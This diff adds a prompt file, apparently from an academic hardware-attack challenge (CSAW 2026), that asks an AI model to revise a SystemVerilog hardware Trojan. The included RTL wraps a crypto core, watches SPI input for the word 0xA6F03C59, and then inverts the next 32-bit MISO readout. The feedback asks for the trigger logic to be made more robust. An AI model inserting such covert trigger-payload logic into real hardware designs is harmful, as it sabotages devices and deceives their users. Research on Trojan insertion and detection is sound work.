@@ -1,0 +1,158 @@
+Model: @vertexai/gemini-3.1-pro-preview
+
+
+Context: CSAW 2026 AI Hardware Attack Challenge, an authorized academic
+FPGA security experiment using a provided, local simulation target.
+Generate a candidate SystemVerilog hardware modification.
+
+Original module recovered has ports:
+pin_36=SCK, pin_25=ENC_DEC, pin_28=NORM_CS_N, pin_32=MOSI,
+pin_34=RST_N, pin_27=START, pin_38=BUSY, pin_23=ICE_LED, pin_31=MISO.
+
+Return exactly ONE SystemVerilog code block containing ONE module called
+recovered. Instantiate recovered_original, connecting the ORIGINAL pin_*
+port names; NEVER redefine recovered_original.
+Preserve the original cryptographic datapath and all untriggered outputs.
+SPI transactions are MSB-first, 32 bits, NORM_CS_N=0, START=0.
+START is asserted separately with NORM_CS_N=1.
+Reset is synchronous active-low. Do not claim functional verification.
+
+Variant: functionality
+Specification:
+Trigger: receive a complete 32-bit SPI word 0xA6F03C59 while NORM_CS_N is low.
+Payload: corrupt only the following 32-bit MISO transfer, without changing cryptographic state.
+The trigger transaction itself must not be corrupted. Clear the effect after one complete readout.
+
+Verified key evidence (if applicable): 
+
+Prior RTL (empty for first attempt):
+module recovered (
+    input  wire pin_36, // SCK
+    input  wire pin_25, // ENC_DEC
+    input  wire pin_28, // NORM_CS_N
+    input  wire pin_32, // MOSI
+    input  wire pin_34, // RST_N
+    input  wire pin_27, // START
+    output wire pin_38, // BUSY
+    output wire pin_23, // ICE_LED
+    output wire pin_31  // MISO
+);
+
+    wire orig_miso;
+
+    // Instantiate original unmodified design
+    recovered_original inst_recovered_original (
+        .pin_36(pin_36),
+        .pin_25(pin_25),
+        .pin_28(pin_28),
+        .pin_32(pin_32),
+        .pin_34(pin_34),
+        .pin_27(pin_27),
+        .pin_38(pin_38),
+        .pin_23(pin_23),
+        .pin_31(orig_miso)
+    );
+
+    logic [31:0] shift_reg;
+    logic [5:0]  bit_cnt;
+    logic        trigger_matched;
+    logic        payload_completed;
+    logic        armed;
+
+    // Block 1: Bit counter with asynchronous reset on transaction boundary (CS high) or RST_N low.
+    // This safely discards any interrupted transactions by resetting the counter immediately.
+    always_ff @(posedge pin_36 or posedge pin_28 or negedge pin_34) begin
+        if (!pin_34) begin
+            bit_cnt <= 6'b0;
+        end else if (pin_28) begin
+            bit_cnt <= 6'b0;
+        end else begin
+            if (bit_cnt == 6'd31) begin
+                bit_cnt <= 6'b0;
+            end else begin
+                bit_cnt <= bit_cnt + 1'b1;
+            end
+        end
+    end
+
+    // Block 2: SPI shift register and match flags (Synchronous to SCK).
+    // During an interrupted transaction or CS high period, these flags reliably hold their final state 
+    // so they can be safely evaluated by the transaction-boundary state machine.
+    always_ff @(posedge pin_36 or negedge pin_34) begin
+        if (!pin_34) begin
+            shift_reg         <= 32'b0;
+            trigger_matched   <= 1'b0;
+            payload_completed <= 1'b0;
+        end else if (!pin_28) begin
+            shift_reg <= {shift_reg[30:0], pin_32};
+            if (bit_cnt == 6'd31) begin
+                payload_completed <= 1'b1;
+                if ({shift_reg[30:0], pin_32} == 32'hA6F03C59) begin
+                    trigger_matched <= 1'b1;
+                end else begin
+                    trigger_matched <= 1'b0;
+                end
+            end else begin
+                trigger_matched   <= 1'b0;
+                payload_completed <= 1'b0;
+            end
+        end
+    end
+
+    // Block 3: Transaction-boundary state machine.
+    // Triggers exactly when NORM_CS_N goes HIGH (end of a transaction).
+    // This strictly ensures that no MISO modifications happen during the tail end of the trigger transaction.
+    always_ff @(posedge pin_28 or negedge pin_34) begin
+        if (!pin_34) begin
+            armed <= 1'b0;
+        end else begin
+            if (trigger_matched) begin
+                // A complete trigger transaction has ended; arm for the next transaction.
+                armed <= 1'b1;
+            end else if (armed && payload_completed) begin
+                // A complete payload transaction has ended; disarm.
+                // An interrupted transaction won't set payload_completed, so it won't consume the payload.
+                armed <= 1'b0;
+            end
+        end
+    end
+
+    // Block 4: Safely apply MISO corruption.
+    // The payload is activated purely on transaction boundaries. Since corruption only occurs
+    // when armed AND NORM_CS_N is active (low), the trigger transaction remains 100% normal.
+    assign pin_31 = (armed && !pin_28) ? ~orig_miso : orig_miso;
+
+endmodule
+
+
+Feedback to address:
+
+The previous functionality RTL correctly delays payload
+activation until CS deasserts after the trigger transfer.
+
+However, two issues remain:
+
+1. trigger_matched and payload_completed retain stale values
+   across CS transitions when no SCK edge occurs.
+2. bit_cnt wraps after 32 bits and can incorrectly treat a
+   longer CS-low transaction as multiple complete transfers.
+
+Revise the transaction tracking so that:
+
+- A trigger is accepted only for a complete 32-bit
+  transaction containing A6F03C59.
+- The trigger transaction's MISO output is never modified.
+- Only the next valid complete 32-bit transaction is corrupted.
+- Corruption ends when that payload transaction finishes.
+- Interrupted or malformed transactions cannot reuse stale
+  completion flags.
+- CS transitions without SCK are handled correctly.
+- State does not wrap into another transaction while CS is low.
+
+Ensure synthesizable, race-free state handling. Avoid multiple
+procedural drivers, inferred latches, and unsafe clocking.
+
+Preserve the original core and its exact package-pin connections.
+
+
+Output only the complete recovered module in a ```systemverilog block.
